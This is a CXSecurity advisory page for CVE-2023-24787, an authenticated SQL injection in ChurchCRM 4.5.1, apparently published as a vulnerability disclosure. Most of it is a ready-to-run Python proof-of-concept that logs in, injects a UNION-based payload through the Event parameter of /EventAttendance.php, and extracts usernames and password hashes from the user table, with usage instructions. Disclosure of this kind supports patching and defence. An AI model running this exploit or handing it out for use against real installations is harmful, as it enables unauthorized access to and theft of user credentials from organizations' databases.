---
title: ChurchCRM 4.5.1 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023040038
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:25.212629
---

# ChurchCRM 4.5.1 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ChurchCRM 4.5.1 SQL Injection** **2023.04.10**  Credit:  **[Arvandy](https://cxsecurity.com/author/Arvandy/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-24787](https://cxsecurity.com/cveshow/CVE-2023-24787/ "Click to see CVE-2023-24787")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: ChurchCRM 4.5.1 - Authenticated SQL Injection
# Date: 11-03-2023
# Exploit Author: Arvandy
# Blog Post: https://github.com/arvandy/CVE/blob/main/CVE-2023-24787/CVE-2023-24787.md
# Software Link: https://github.com/ChurchCRM/CRM/releases
# Vendor Homepage: http://churchcrm.io/
# Version: 4.5.1
# Tested on: Windows, Linux
# CVE: CVE-2023-24787
"""
The endpoint /EventAttendance.php is vulnerable to Authenticated SQL Injection (Union-based and Blind-based) via the Event GET parameter.
This endpoint can be triggered through the following menu: Events - Event Attendance Reports - Church Service/Sunday School.
The Event Parameter is taken directly from the query string and passed into the SQL query without any sanitization or input escaping.
This allows the attacker to inject malicious Event payloads to execute the malicious SQL query.
This script is created as Proof of Concept to retrieve the username and password hash from user\_usr table.
"""
import sys, requests
def dumpUserTable(target, session\_cookies):
print("(+) Retrieving username and password")
print("")
url = "%s/EventAttendance.php?Action=List&Event=2+UNION+ALL+SELECT+1,NULL,CONCAT('Perseverance',usr\_Username,':',usr\_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user\_usr--+-&Type=Sunday School" % (target)
headers = {'Content-Type':'application/x-www-form-urlencoded','Cookie':'CRM-2c90cf299230a50dab55aee824ed9b08='+str(session\_cookies)}
r = requests.get(url, headers=headers)
lines = r.text.splitlines()
for line in lines:
if "<td >Perseverance" in line:
print(line.split("Perseverance")[1].split("</td>")[0])
def login(target, username, password):
target = "%s/session/begin" % (target)
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
data = "User=%s&Password=%s" % (username, password)
s = requests.session()
r = s.post(target, data = data, headers = headers)
return s.cookies.get('CRM-2c90cf299230a50dab55aee824ed9b08')
def main():
print("(!) Login to the target application")
session\_cookies = login(target, username, password)
print("(!) Exploiting the Auth SQL Injection to retrieve the username and password hash")
dumpUserTable(target, session\_cookies)
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) != 4:
print("(!) Usage: python3 exploit.py <URL> <username> <password>")
print("(!) E.g.,: python3 exploit.py http://192.168.1.100/ChurchCRM user pass")
sys.exit(-1)
target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040038)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top